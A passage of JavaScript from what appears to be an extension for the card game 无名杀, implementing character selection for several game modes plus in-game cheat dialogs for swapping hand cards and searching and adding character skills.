                                switch (game.zhu.name) {
                                    case 'liubei':
                                        skill = 'jizhen';
                                        break;
                                    case 'dongzhuo':
                                        skill = 'hengzheng';
                                        break;
                                    case 'sunquan':
                                        skill = 'batu';
                                        break;
                                    case 'sp_zhangjiao':
                                        skill = 'tiangong';
                                        break;
                                    case 'liushan':
                                        skill = 'shengxi';
                                        break;
                                    case 'sunce':
                                        skill = 'ciqiu';
                                        break;
                                    case 're_sunben':
                                        skill = 'ciqiu';
                                        break;
                                    case 'yuanshao':
                                        skill = 'geju';
                                        break;
                                    case 're_caocao':
                                        skill = 'dangping';
                                        break;
                                    case 'caopi':
                                        skill = 'junxing';
                                        break;
                                    case 'liuxie':
                                        skill = 'moukui';
                                        break;
                                    default:
                                        skill = 'tianming';
                                        break;
                                }
                                game.broadcastAll(function (player, skill) {
                                    target.addSkill(skill,false,false,false,true);
                                    target.storage.enhance_zhu = skill;
                                }, game.zhu, skill);
                            }
                        }
                        if (get.mode() == 'doudizhu') {
                            if (['normal', 'huanle', 'kaihei'].contains(_status.mode)) {
                                var skill = ['feiyang', 'bahu'];
                                game.broadcastAll(function (player, skill) {
                                    target.addSkill(skill,false,false,false,true);
                                }, game.zhu, skill);
                            }
                            if (_status.mode == 'binglin') {
                                var skill = game.zhuSkill;
                                game.broadcastAll(function (player, skill) {
                                    target.addSkill(skill,false,false,false,true);
                                }, game.zhu, skill);
                            }
                        }
                    } else {
                        if (_status.mode == 'binglin') {
                            var skill = ['binglin_shaxue', 'binglin_neihong'];
                            game.broadcastAll(function (player, skill) {
                                target.addSkill(skill,false,false,false,true);
                            }, target, skill);
                        }
                    }
                    if (_status.mode == 'online') {
                        game.zhu.hp = 4;
                        game.zhu.maxHp = 4;
                        game.zhu.update();
                        target.storage.doudizhu_cardPile = event.cardPile;
                        target.markSkill('doudizhu_cardPile');
                    }
                    if (_status.mode == 'purple') {
                        if (target == game.rZhu || target == game.bZhu) {
                            target.hp++;
                            target.maxHp++;
                            target.update();
                        }
                    }
                    /*for(var i=0;i<game.players.length;i++){
                        if(game.players[i]!=game.zhu&&game.players[i]!=target){
                            event.list.randomSort();
                            event.ai(game.players[i],event.list.splice(0,get.config('choice_'+game.players[i].identity)),null,event.list)
                        }
                    }*/
                    "step 3"
                    if (event.reai) target.ai = lib.qyDeepClone(event.reai);
                    if (event.group) {
                        target.group = event.group;
                        target.node.name.dataset.nature = get.groupnature(target.group);
                        target.update();
                    }
                    for (var i = 0; i < game.players.length; i++) {
                        _status.characterlist.remove(game.players[i].name);
                        _status.characterlist.remove(game.players[i].name1);
                        _status.characterlist.remove(game.players[i].name2);
                    }
                    "step 4"
                    setTimeout(function () {
                        ui.arena.classList.remove('choose-character');
                    }, 500);

                    if (event.special_identity) {
                        for (var i = 0; i < event.special_identity.length; i++) {
                            game.zhu.addSkill(event.special_identity[i],false,false,false,true);
                        }
                    }
                });
            },
            // 国战
            chooseCharacterGuoZhan: function () {
                var next = game.createEvent('chooseCharacter', false);
                next.showConfig = true;
                next.addPlayer = true;
                next.target = this;
                next.player = game.me;
                next.ai = function (player, list, back) {
                    if (_status.brawl && _status.brawl.chooseCharacterAi) {
                        if (_status.brawl.chooseCharacterAi(player, list, back) !== false) {
                            return;
                        }
                    }
                    var filterChoice = function (name1, name2) {
                        if (get.is.double(name1)) return false;
                        var group1 = lib.character[name1][1];
                        var group2 = lib.character[name2][1];
                        if (group1 == 'ye') return group2 != 'ye';
                        var double = get.is.double(name2, true);
                        if (double) return double.contains(group1);
                        return group1 == group2;
                    };
                    for (var i = 0; i < list.length - 1; i++) {
                        for (var j = i + 1; j < list.length; j++) {
                            if (filterChoice(list[i], list[j]) || filterChoice(list[j], list[i])) {
                                var mainx = list[i];
                                var vicex = list[j];
                                if (!filterChoice(mainx, vicex) || (filterChoice(vicex, mainx) && get.guozhanReverse(mainx, vicex))) {
                                    mainx = list[j];
                                    vicex = list[i];
                                }
                                player.init(mainx, vicex, false);
                                if (back) {
                                    list.remove(player.name1);
                                    list.remove(player.name2);
                                    for (var i = 0; i < list.length; i++) {
                                        back.push(list[i]);
                                    }
                                }
                                return;
                            }
                        }
                    }
                }
                next.setContent(function () {
                    "step 0"
                    ui.arena.classList.add('choose-character');
                    var addSetting = function (dialog) {
                        dialog.add('选择座位').classList.add('add-setting');
                        var seats = document.createElement('table');
                        seats.classList.add('add-setting');
                        seats.style.margin = '0';
                        seats.style.width = '100%';
                        seats.style.position = 'relative';
                        for (var i = 1; i <= game.players.length; i++) {
                            var td = ui.create.div('.shadowed.reduce_radius.pointerdiv.tdnode');
                            td.innerHTML = '<span>' + get.cnNumber(i, true) + '</span>';
                            td.link = i - 1;
                            seats.appendChild(td);
                            td.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function () {
                                if (_status.dragged) return;
                                if (_status.justdragged) return;
                                if (_status.cheat_seat) {
                                    _status.cheat_seat.classList.remove('bluebg');
                                    if (_status.cheat_seat == this) {
                                        delete _status.cheat_seat;
                                        return;
                                    }
                                }
                                this.classList.add('bluebg');
                                _status.cheat_seat = this;
                            });
                        }
                        dialog.content.appendChild(seats);
                        if (game.me == game.zhu) {
                            seats.previousSibling.style.display = 'none';
                            seats.style.display = 'none';
                        }
                        dialog.add(ui.create.div('.placeholder.add-setting'));
                        dialog.add(ui.create.div('.placeholder.add-setting'));
                        if (get.is.phoneLayout()) dialog.add(ui.create.div('.placeholder.add-setting'));
                    };
                    var removeSetting = function () {
                        var dialog = _status.event.dialog;
                        if (dialog) {
                            dialog.style.height = '';
                            delete dialog._scrollset;
                            var list = Array.from(dialog.querySelectorAll('.add-setting'));
                            while (list.length) {
                                list.shift().remove();
                            }
                            ui.update();
                        }
                    };
                    event.addSetting = addSetting;
                    event.removeSetting = removeSetting;
                    var chosen = lib.config.continue_name || [];
                    game.saveConfig('continue_name');
                    event.chosen = chosen;
                    var i;
                    event.list = [];
                    for (i in lib.character) {
                        if (i.indexOf('gz_shibing') === 0) continue;
                        if (i.indexOf('key_') === 0) continue;
                        if (lib.character[i][1] === 'key') continue;
                        if (chosen.contains(i)) continue;
                        if (lib.filter.characterDisabled(i)) continue;
                        if (get.config('onlyguozhan')) {
                            if (!lib.characterPack.mode_guozhan[i]) continue;
                            if (get.is.jun(i)) continue;
                        }
                        if (lib.character[i][4].contains('hiddenSkill')) continue;
                        if (lib.character[i][2] == 3 || lib.character[i][2] == 4 || lib.character[i][2] == 5)
                            event.list.push(i);

                    }
                    _status.characterlist = event.list.slice(0);
                    _status.yeidentity = [];
                    if (_status.brawl && _status.brawl.chooseCharacterFilter) {
                        event.list = _status.brawl.chooseCharacterFilter(event.list);
                    }
                    event.list.randomSort();
                    // var list=event.list.splice(0,parseInt(get.config('choice_num')));
                    var list;
                    if (_status.brawl && _status.brawl.chooseCharacter) {
                        list = _status.brawl.chooseCharacter(event.list, game.me);
                    } else {
                        list = game.getCharacterChoice(event.list, parseInt(get.config('choice_num')));
                    }
                    if (_status.auto) {
                        event.ai(target, list);
                        lib.init.onfree();
                    } else if (chosen.length) {
                        game.me.init(chosen[0], chosen[1], false);
                        lib.init.onfree();
                    } else {
                        event.dialogxx = ui.create.characterDialog('heightset', function (i) {
                            if (i.indexOf('gz_shibing') == 0) return true;
                            if (get.config('onlyguozhan')) {
                                if (!lib.characterPack.mode_guozhan[i]) return true;
                                if (get.is.jun(i)) return true;
                            }
                        }, get.config('onlyguozhanexpand') ? 'expandall' : undefined, get.config('onlyguozhan') ? 'onlypack:mode_guozhan' : undefined, target);
                        var dialog = ui.create.dialog('选择角色', 'hidden', [list, 'character']);
                        if (!_status.brawl || !_status.brawl.noAddSetting) {
                            if (get.config('change_identity')) {
                                addSetting(dialog);
                            }
                        }
                        var next = game.me.chooseButton(event.dialogxx, true, 2).set('onfree', true);
                        next.filterButton = function (button) {
                            if (ui.dialog.buttons.length <= 10) {
                                for (var i = 0; i < ui.dialog.buttons.length; i++) {
                                    if (ui.dialog.buttons[i] != button) {
                                        if (lib.element.player.perfectPair.call({
                                            name1: button.link, name2: ui.dialog.buttons[i].link
                                        })) {
                                            button.classList.add('glow2');
                                        }
                                    }
                                }
                            }
                            if (lib.character[button.link][4].contains('hiddenSkill')) return false;
                            if (ui.selected.buttons.length == 0) {
                                if (get.is.double(button.link)) return false;
                                if (lib.character[button.link][1] == 'ye') return true;
                                for (var i = 0; i < ui.dialog.buttons.length; i++) {
                                    var double = get.is.double(ui.dialog.buttons[i].link, true);
                                    if (ui.dialog.buttons[i] != button && (lib.character[button.link][1] == lib.character[ui.dialog.buttons[i].link][1] || double && double.contains(lib.character[button.link][1]))) {
                                        return true;
                                    }
                                }
                                return false;
                            }
                            if (!lib.character[button.link] || lib.character[button.link][1] == 'ye') return false;
                            if (get.is.double(ui.selected.buttons[0].link)) return false;
                            if (lib.character[ui.selected.buttons[0].link][1] == 'ye') return true;
                            if (get.is.double(button.link)) return get.is.double(button.link, true).contains(lib.character[ui.selected.buttons[0].link][1]);
                            return (lib.character[button.link][1] == lib.character[ui.selected.buttons[0].link][1]);
                        };
                        next.switchToAuto = function () {
                            event.ai(target, list);
                            ui.arena.classList.remove('selecting');
                        };
                    }
                    "step 1"
                    if (ui.cheat) {
                        ui.cheat.close();
                        delete ui.cheat;
                    }
                    if (ui.cheat2) {
                        ui.cheat2.close();
                        delete ui.cheat2;
                    }
                    if (result.buttons) {
                        //lib.element.player.uninit.call(target);
                        lib.element.player.init.call(target, result.buttons[0].link, result.buttons[1].link, false);
                        game.addRecentCharacter(result.buttons[0].link, result.buttons[1].link);
                    }
                    target.setIdentity(target.group);
                    /*event.list.remove(game.me.name1);
                    event.list.remove(game.me.name2);
                    for(var i=0;i<game.players.length;i++){
                        if(game.players[i]!=game.me){
                            event.ai(game.players[i],game.getCharacterChoice(event.list,parseInt(get.config('choice_num'))),event.list);
                        }
                    }*/
                    target.classList.add('unseen');
                    target.classList.add('unseen2');
                    if (target != game.me) {
                        target.node.identity.firstChild.innerHTML = '猜';
                        target.node.identity.dataset.color = 'unknown';
                        target.node.identity.classList.add('guessing');
                    }
                    target.hiddenSkills = lib.character[target.name1][3].slice(0);
                    var hiddenSkills2 = lib.character[target.name2][3];
                    for (var j = 0; j < hiddenSkills2.length; j++) {
                        target.hiddenSkills.add(hiddenSkills2[j]);
                    }
                    for (var j = 0; j < target.hiddenSkills.length; j++) {
                        if (!lib.skill[target.hiddenSkills[j]]) {
                            target.hiddenSkills.splice(j--, 1);
                        }
                    }
                    target.group = 'unknown';
                    target.sex = 'unknown';
                    target.name1 = target.name;
                    target.name = 'unknown';
                    target.identity = 'unknown';
                    target.node.name.show();
                    target.node.name2.show();
                    target._group = lib.character[target.name1][1];
                    for (var j = 0; j < target.hiddenSkills.length; j++) {
                        target.addSkillTrigger(target.hiddenSkills[j], true);
                    }
                    /*for(var i=0;i<game.players.length;i++){
                        game.players[i].classList.add('unseen');
                        game.players[i].classList.add('unseen2');
                        _status.characterlist.remove(game.players[i].name);
                        _status.characterlist.remove(game.players[i].name2);
                        if(game.players[i]!=game.me){
                            game.players[i].node.identity.firstChild.innerHTML='猜';
                            game.players[i].node.identity.dataset.color='unknown';
                            game.players[i].node.identity.classList.add('guessing');
                        }
                        game.players[i].hiddenSkills=lib.character[game.players[i].name1][3].slice(0);
                        var hiddenSkills2=lib.character[game.players[i].name2][3];
                        for(var j=0;j<hiddenSkills2.length;j++){
                            game.players[i].hiddenSkills.add(hiddenSkills2[j]);
                        }
                        for(var j=0;j<game.players[i].hiddenSkills.length;j++){
                            if(!lib.skill[game.players[i].hiddenSkills[j]]){
                                game.players[i].hiddenSkills.splice(j--,1);
                            }
                        }
                        game.players[i].group='unknown';
                        game.players[i].sex='unknown';
                        game.players[i].name1=game.players[i].name;
                        game.players[i].name='unknown';
                        game.players[i].identity='unknown';
                        game.players[i].node.name.show();
                        game.players[i].node.name2.show();
                        game.players[i]._group=lib.character[game.players[i].name1][1];
                        for(var j=0;j<game.players[i].hiddenSkills.length;j++){
                            game.players[i].addSkillTrigger(game.players[i].hiddenSkills[j],true);
                        }
                    }*/
                    setTimeout(function () {
                        ui.arena.classList.remove('choose-character');
                    }, 500);
                });
            },
        };
        lib.skill._qingyao_AIxuanjiang = {
            trigger: {
                global: 'gameStart',
                player: 'enterGame',
            },
            forced: true,
            popup: false,
            silent: true,
            priority: 523,
            firstDo: true,
            filter: function (event, player) {
                return player === game.me && ['identity', 'guozhan', 'doudizhu'].contains(lib.config.mode);
            },
            content: function () {
                'step 0'
                player.chooseTarget([1, 1], get.prompt('AI选将'), "请选择一名角色并替换其武将牌", lib.filter.all).set('ai', function (target) {
                    return 0;
                });
                'step 1'
                if (result.bool) {
                    event.target = result.targets[0];
                    lib.choosePlayer.chooseCharacter(event.target);
                } else event.finish();
                'step 2'
                event.goto(0);
            },
        };
    }

    // 替换手牌
    if (config.qingyao_replace_card) {
        lib.skill['_qy-replace-card'] = {
            trigger: {
                global: 'gameDrawAfter',
            },
            forecd: true,
            direct: true,
            priority: 1534,
            firstDo: true,
            silent: true,
            popup: false,
            filter: function (event, player) {
                return player === game.me;
            },
            content: function () {
                'step 0'
                player.chooseTarget(get.prompt('定向手气卡'), "选择一名角色的手牌与场上所有牌进行调整。", lib.filter.all).set('ai', function (target) {
                    return 0;
                });
                'step 1'
                if (result.bool) {
                    event.target = result.targets[0];
                    const dialog = ui.create.dialog('hidden', 'forcebutton', '定向手气卡：你可以选择一名角色的手牌与场上所有牌自由调整。');
                    dialog.classList.add('noupdate', 'fixed');

                    function setProprty(property) {
                        for (const [key, value] of Object.entries(property)) {
                            dialog.style.setProperty(key, value, 'important');
                        }
                    }

                    setProprty({
                        height: '70%',
                        width: 'calc(100% - 95px)',
                        left: '50%',
                        top: lib.qyUtils.isMobile ? '40%' : '30%',
                        transition: 'none',
                        transform: 'translate(-50%,-50%)',
                        animation: 'none',
                        'background-size': '100% 100%',
                        fontFamily: 'shousha',
                    });
                    dialog.classList.add('qy_card_selected')
                    dialog.style.setProperty('background-image', 'url("' + lib.assetURL + 'extension/清瑶葭绮/members/假装无敌/images/replace_card_backronud.png")', 'important');
                    dialog.content.css({
                        'margin-top': '2%',
                    });
                    dialog.addEventListener(lib.config.touchscreen ? 'touchend' : 'mouseup', function () {
                        _status.clicked2 = true;
                    });

                    const namecapt = [], typeList = [], node = ui.create.div('.caption.pointerspan'),
                        getCapt = function (str) {
                            var capt;
                            if (str.indexOf('_') == -1) {
                                capt = str[0];
                            } else {
                                capt = str[str.lastIndexOf('_') + 1];
                            }
                            capt = capt.toLowerCase();
                            if (!/[a-z]/i.test(capt)) {
                                capt = '自定义';
                            }
                            return capt;
                        }, cardList = [], div = ui.create.div(dialog.content, 1, {
                            display: 'block',
                        }), input = ui.create.node('input', div), newlined2 = document.createElement('div'),
                        packsource = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin', '卡牌类型', {
                            margin: '3px',
                            display: 'inline-block',
                        });
                    input.placeholder = '请输入卡牌名称';
                    dialog.add(node);

                    event._reuslt = {
                        cancel: true,
                        player: [],
                        target: [],
                    };

                    var _event = event;
                    let restSelectButton = function () {
                        dialog.querySelectorAll('.qy_selected').forEach(current => {
                            current.classList.remove('qy_selected');
                        });
                        _event._reuslt = {
                            cancel: true,
                            player: [],
                            target: [],
                        }
                        _event.ok.hide();
                        targetCards = _event.target.get('h');
                    }

                    const replaceCards = function (sources, targets, isButton = false) {
                        for (let i = 0; i < sources.length; i++) {
                            let card1 = sources[i];
                            let card2 = targets[i];
                            let parentElement = card2.parentElement;
                            let index = Array.from(parentElement.childNodes).indexOf(card2);
                            card1.parentElement.replaceChild(card2, card1);
                            parentElement.insertBefore(card1, parentElement.childNodes[index]);
                        }
                        isButton ? restSelectButton() : ui.updatehl();
                    };

                    event.ok = ui.create.control('确定', function () {
                        let card1Links = event._reuslt.player.map(current => current.link);
                        let card2Links = event._reuslt.target.map(current => current.link);
                        replaceCards(card1Links, card2Links);

                        let card1 = event._reuslt.player;
                        let card2 = event._reuslt.target;
                        replaceCards(card1, card2, true);
                    });
                    event.ok.hide();

                    event.cancel = ui.create.control('取消该角色换牌', game.resume);

                    let seachButton;

                    const clickButton = function () {
                        if (!_status.event.isMine()) return;
                        this.classList.toggle('qy_selected');
                        // 开始自己的代码逻辑
                        if (targetCards.contains(this.link)) {
                            if (event._reuslt.player.contains(this)) {
                                event._reuslt.player.remove(this);
                            } else {
                                event._reuslt.player.add(this);
                            }
                        } else {
                            if (event._reuslt.target.contains(this)) {
                                event._reuslt.target.remove(this);
                            } else {
                                event._reuslt.target.add(this);
                            }
                        }
                        checkDataNum();

                        if (event._reuslt.player.length > 0 && event._reuslt.player.length === event._reuslt.target.length) {
                            event.ok.show();
                        } else {
                            event.ok.hide();
                        }
                    }

                    const checkDataNum = function () {
                        event._reuslt.player.forEach((current, index) => {
                            current.dataset.num = get.cnNumber(index + 1, true);
                        })
                        event._reuslt.target.forEach((current, index) => {
                            current.dataset.num = get.cnNumber(index + 1, true);
                        })
                    }

                    const createOpenCards = function (list, num = 10) {
                        dialog.add([list.slice(0, num), 'vcard']);
                        if (num > list.length) return false; // 展示完了就不添加展开按钮了

                        let buttons = dialog.querySelectorAll('.buttons');
                        const buttonsElement = buttons[buttons.length - 1];
                        const caption = ui.create.div(".caption");
                        const openElement = ui.create.div('.menubutton.highlight', '展开', {
                            width: '60%',
                            fontSize: '24px',
                            cursor: 'pointer',
                            display: 'inline-block',
                            textAlign: 'center',
                        }, function (event) {
                            event.stopPropagation();
                            const buttons = ui.create.buttons(list.slice(this.currentNum, this.currentNum + this.step), 'vcard', buttonsElement);
                            buttons.forEach(button => {
                                button.capt = getCapt(button.link.name);
                                button.addEventListener('click', clickButton, true);
                            });
                            dialog.buttons = dialog.buttons.concat(buttons);
                            this.currentNum += this.step;
                            if (this.currentNum > list.length) {
                                this.delete();
                                this.parentNode.delete();
                            }
                            seachButton();
                        }, caption);
                        openElement.step = num;
                        openElement.currentNum = num;
                        dialog.add(caption);
                    }

                    dialog.add('<span style="color:red;">「注」：若使用搜索或筛选功能找不到想要的牌，请尝试多次点击【展开】</span>');

                    dialog.add(`<div style="color: rgb(0, 255, 50);text-align: center;background-image: linear-gradient(to right, transparent 0%, rgba(255, 165, 0, 0.65) 10%, rgba(255, 165, 0, 0.65) 90%, transparent 100%);width: 90%;left: 50%;transform: translateX(-50%);">${get.translation(event.target)}的手牌</div>`);
                    let targetCards = event.target.get('h');
                    createOpenCards(targetCards);

                    game.players
                        .filter(current => current !== event.target)
                        .forEach(current => {
                            dialog.add(`<div style="text-align: center;background-image: linear-gradient(to right, transparent 0%, rgba(255, 165, 0, 0.65) 10%, rgba(255, 165, 0, 0.65) 90%, transparent 100%);width: 90%;left: 50%;transform: translateX(-50%);">${get.translation(current)}的手牌</div>`);
                            let cards = current.get('h');
                            createOpenCards(cards);
                            cardList.addArray(cards);
                        });
                    if (ui.cardPile && ui.cardPile.childElementCount > 0) {
                        dialog.add("<div style='text-align: center;background-image: linear-gradient(to right, transparent 0%, rgba(255, 165, 0, 0.65) 10%, rgba(255, 165, 0, 0.65) 90%, transparent 100%);width: 90%;left: 50%;transform: translateX(-50%);'>牌堆的牌</div>");
                        let cards = Array.from(ui.cardPile.childNodes);
                        // dialog.add([cards, 'vcard']);
                        createOpenCards(cards, 50);
                        cardList.addArray(cards);
                    }
                    if (ui.cardPile && ui.discardPile.childElementCount > 0) {
                        dialog.add("<div style='text-align: center;background-image: linear-gradient(to right, transparent 0%, rgba(255, 165, 0, 0.65) 10%, rgba(255, 165, 0, 0.65) 90%, transparent 100%);width: 90%;left: 50%;transform: translateX(-50%);'>弃牌堆的牌</div>");
                        let cards = Array.from(ui.discardPile.childNodes);
                        // dialog.add([cards, 'vcard']);
                        createOpenCards(cards, 50);
                        cardList.addArray(cards);
                    }
                    cardList.map(current => current.name)
                        .forEach(current => {
                            namecapt.add(getCapt(current));
                            typeList.add(get.type(current));
                        });

                    namecapt.sort();

                    dialog.isSuccess = function (button) {
                        let link = get.translation(button.name),
                            type = get.type(button),
                            capt = button.capt;
                        if (targetCards.contains(button.link)) return true;
                        if (input.value && link.indexOf(input.value) === -1) return false;
                        if (this.currentcapt && this.currentcapt !== capt) return false;
                        if (this.currenttype && this.currenttype !== type) return false;
                        return true;
                    }

                    input.oninput = function (e) {
                        e.stopPropagation();
                        for (var i = 0; i < dialog.buttons.length; i++) {
                            if (dialog.isSuccess(dialog.buttons[i]))
                                dialog.buttons[i].classList.remove('nodisplay');
                            else
                                dialog.buttons[i].classList.add('nodisplay');
                        }
                    }
                    input.onkeydown = function (event) {
                        event && event.stopPropagation();
                        if (event.keyCode === 13) this.oninput(event);
                    };

                    seachButton = function () {
                        for (var i = 0; i < dialog.buttons.length; i++) {
                            if (dialog.isSuccess(dialog.buttons[i])) {
                                dialog.buttons[i].classList.remove('nodisplay');
                            } else {
                                dialog.buttons[i].classList.add('nodisplay');
                            }
                        }
                    }
                    var clickCapt = function (e) {
                        if (_status.dragged) return;
                        if (this.classList.contains('thundertext')) {
                            dialog.currentcapt = null;
                            dialog.currentcaptnode = null;
                            this.classList.remove('thundertext');
                        } else {
                            if (dialog.currentcaptnode) {
                                dialog.currentcaptnode.classList.remove('thundertext');
                            }
                            dialog.currentcapt = this.link;
                            dialog.currentcaptnode = this;
                            this.classList.add('thundertext');
                        }
                        seachButton();
                        if (e) e.stopPropagation();
                    };
                    for (var i = 0; i < namecapt.length; i++) {
                        var span = document.createElement('span');
                        span.innerHTML = ' ' + namecapt[i].toUpperCase() + ' ';
                        span.link = namecapt[i];
                        span.className = 'tdnode pointerdiv shadowed reduce_radius reduce_margin';
                        span.alphabet = true;
                        span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickCapt);
                        node.appendChild(span);
                    }
                    node.appendChild(packsource);

                    const clickType = function (e) {
                        if (_status.dragged) return;
                        if (this.classList.contains('thundertext')) {
                            dialog.currenttype = null;
                            dialog.currenttypenode = null;
                            this.classList.remove('thundertext');
                            packsource.innerHTML = '卡牌类型';
                            packsource.classList.remove('thundertext');
                        } else {
                            if (dialog.currenttypenode) {
                                dialog.currenttypenode.classList.remove('thundertext');
                            }
                            dialog.currenttype = this.link;
                            dialog.currenttypenode = this;
                            this.classList.add('thundertext');
                            packsource.classList.add('thundertext');
                            packsource.innerHTML = get.translation(this.link);
                        }
                        this.parentNode.style.display = 'none';
                        seachButton();
                        if (e) e.stopPropagation();
                    }

                    typeList.forEach(current => {
                        ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius.reduce_margin', get.translation(current), newlined2, {
                            display: 'inline-block',
                            width: 'auto',
                            margin: '5px',
                            fontSize: '22px',
                        }, clickType).link = current;
                    });
                    newlined2.style.marginTop = '5px';
                    newlined2.style.display = 'none';
                    newlined2.style.fontFamily = 'xinwei';
                    newlined2.classList.add('pointernode');
                    if (get.is.phoneLayout()) {
                        newlined2.style.fontSize = '32px';
                    } else {
                        newlined2.style.fontSize = '22px';
                    }
                    newlined2.style.textAlign = 'center';

                    node.appendChild(newlined2);

                    packsource.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', function () {
                        if (_status.dragged) return;
                        if (newlined2.style.display == 'none') {
                            newlined2.style.display = 'block';
                        } else {
                            newlined2.style.display = 'none';
                        }
                    });

                    for (i = 0; i < dialog.buttons.length; i++) {
                        dialog.buttons[i].capt = getCapt(dialog.buttons[i].link.name);
                        dialog.buttons[i].addEventListener('click', clickButton, true);
                    }
                    // 重写打开方法
                    dialog.open = function () {
                        if (this.noopen) return;
                        for (var i = 0; i < ui.dialogs.length; i++) {
                            if (ui.dialogs[i] == this) {
                                this.show();
                                this.refocus();
                                ui.dialogs.remove(this);
                                ui.dialogs.unshift(this);
                                ui.update();
                                return this;
                            }
                            if (ui.dialogs[i].static) ui.dialogs[i].unfocus();
                            else ui.dialogs[i].hide();
                        }
                        ui.dialog = this;
                        ui.arena.appendChild(this);
                        ui.dialogs.unshift(this);
                        ui.update();
                        ui.refresh(this);
                    }
                    dialog.open();
                    /*player.chooseButton(dialog,2).set('filterButton',function(button,player){
                        if(!ui.selected.buttons.length) return true;
                        const card = button.link;
                        const buttonLink = ui.selected.buttons[0].link;
                        if(targetCards.contains(buttonLink)){
                            if(targetCards.contains(card)) return false;
                            return true;
                        }else return targetCards.contains(card);
                    })*/
                    // .set('closeDialog',false);
                    game.pause();

                    event.dialog = dialog;
                    // window.dialog = dialog;
                } else event.finish();
                'step 2'
                if (event.dialog) event.dialog.close();
                if (event.ok) event.ok.close();
                if (event.cancel) event.cancel.close();
                event.goto(0);
            },
        }
    }
    // 搜索添加技能
    if (config.qingyao_searchSkill) {
        lib.skill['_qy-search-skill'] = {
            enable: 'phaseUse',
            filter: (event, player) => game.me === player,
            content() {
                'step 0'
                const dialog = event.dialog = ui.create.dialog('forcebutton');
                dialog.addText("选择技能获取");
                dialog.classList.add('noupdate', 'fixed');

                function setProprty(property) {
                    for (const [key, value] of Object.entries(property)) {
                        dialog.style.setProperty(key, value, 'important');
                    }
                }

                setProprty({
                    height: '70%',
                    width: 'calc(100% - 95px)',
                    left: '50%',
                    top: lib.qyUtils.isMobile ? '40%' : '30%',
                    transition: 'none',
                    transform: 'translate(-50%,-50%)',
                    animation: 'none',
                    backgroundSize: '100% 100%',
                    fontFamily: 'shousha',
                });
                event.ok = ui.create.control('确定', function (evt) {
                    _status.event._result.bool = true;
                    game.resume2();
                    event.ok.remove();
                });
                event.ok.hide();

                event.cancel = ui.create.control('取消', game.resume2);

                // 初始化选项
                event._result = {
                    bool: false,
                    links: [],
                }

                dialog.content.css({
                    'margin-top': '2%',
                });
                dialog.addEventListener(lib.config.touchscreen ? 'touchend' : 'mouseup', function () {
                    _status.clicked2 = true;
                });
                var div = ui.create.div(dialog.content, 1, {
                    display: 'block',
                }), input = ui.create.node('input', div);
                input.placeholder = '请输入武将ID搜索技能';
                const contentList = [];

                const characterNameList = Object.keys(lib.character).map(current => {

                    const skills = (lib.character[current]?.[3] ?? []).flatMap(item => {
                        const info = lib.skill[item];
                        if (!info) return [];
                        const arr = [item];
                        const {derivation = []} = info;
                        return arr.concat(derivation);
                    });
                    const skillsTranslate = skills.map(item => get.translation(item));
                    const skillsTranslateInfo = skills.map(item => lib.translate[item + '_info'] ?? "暂无描述");
                    return {
                        characterID: current,
                        translation: get.translation(current),
                        skills,
                        skillsTranslate,
                        skillsTranslateInfo,
                    }
                });

                /* 清空选项 */
                function restSelectTable() {
                    contentList.forEach(div => div.remove());
                    if (event.ok) event.ok.hide();
                    _status.event._result = {
                        bool: false,
                        links: [],
                    }
                }

                function replaceKeywords(str, keyWordsRegExp) {
                    return str.replace(new RegExp(keyWordsRegExp, 'g'), (...args) => {
                        if (!args[0]) return '';
                        return `<span style="color: red !important;">${args[0]}</span>`;
                    });
                }

                function createSkillItem(skillName, keyWordsRegExp) {
                    var translation = get.translation(skillName);
                    if (translation[0] == '新' && translation.length == 3) {
                        translation = translation.slice(1, 3);
                    } else {
                        translation = translation.slice(0, 2);
                    }

                    var skillInfo = lib.translate[skillName + '_info'] ?? "暂无描述";
                    var item = `
                        <div class="popup pointerdiv" style="width:100%;display:inline-block;margin-top: 10px;">
                            <div class="skill">【${replaceKeywords(skillName, keyWordsRegExp)}｜${replaceKeywords(translation, keyWordsRegExp)}】</div>
                            <div>${replaceKeywords(skillInfo, keyWordsRegExp)}</div>
                        </div>
                    `;

                    return item;
                }

                input.oninput = function (e) {
                    e.stopPropagation();
                    restSelectTable();

                    var value = this.value;

                    if (!value) {
                        return;
                    }

                    function escapeRegExp(string) {
                        return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); // $& 表示整个匹配的子串
                    }

                    var escapeReg = escapeRegExp(value);

                    var testPattern = new RegExp(escapeReg.split(" ").filter(item => !!item).join("|"), 'ig');//new RegExp(Array.from(value).join('|'), 'i');

                    // (匹配内容)|(匹|配|内|容)
                    var regExp = testPattern;

                    const isMatched = (str, pattern) => str.search(pattern) !== -1;

                    // 匹配关键字
                    const isCharacterMatched = ({
                                                    characterID,
                                                    translation,
                                                    skills,
                                                    skillsTranslate,
                                                    skillsTranslateInfo
                                                }) => {
                        return isMatched(characterID, testPattern) ||
                            isMatched(translation, testPattern) ||
                            skills.some(skill => isMatched(skill, testPattern)) ||
                            skillsTranslate.some(skill => isMatched(skill, testPattern))/* ||
                            skillsTranslateInfo.some(skill => isMatched(skill, testPattern))*/;
                    };

                    characterNameList.filter(isCharacterMatched)
                        .forEach(({characterID, translation, skills = []}) => {
                            const characterElement = lib.character[characterID];
                            if (!characterElement || !characterElement[3]) return;

                            const caption = dialog.add(`<div class="text center" style="font-size: 25px;">${replaceKeywords(characterID, regExp)}｜${replaceKeywords(get.translation(characterID), regExp)}</div>`);
                            caption.classList.add('popup');
                            skills.forEach(skillName => {
                                const html = createSkillItem(skillName, regExp);
                                caption.insertAdjacentHTML('beforeend', html);
                                const childNodes = caption.childNodes;
                                const node = childNodes[childNodes.length - 2];
                                node.addEventListener('click', function () {
                                    if (!this.classList.contains('bluebg')) {
                                        this.classList.add('bluebg');
                                        _status.event._result.links.add(skillName);
                                        event.ok.show();
                                    } else {
                                        this.classList.remove('bluebg');
                                        _status.event._result.links.remove(skillName);
                                        if (!_status.event._result.links.length) {
                                            event.ok.hide();
                                        }
                                    }
                                });
                            });
                            contentList.push(caption);
                        });
                }
                input.onkeydown = function (event) {
                    event && event.stopPropagation();
                    if (event.keyCode === 13) this.oninput(event);
                }
                game.pause2();
                'step 1'
                if (event.dialog) event.dialog.close();
                if (event.ok) event.ok.close();
                if (event.cancel) event.cancel.close();
                if (!result?.bool || !result.links?.length) return event.finish();
                event.skills = result.links;
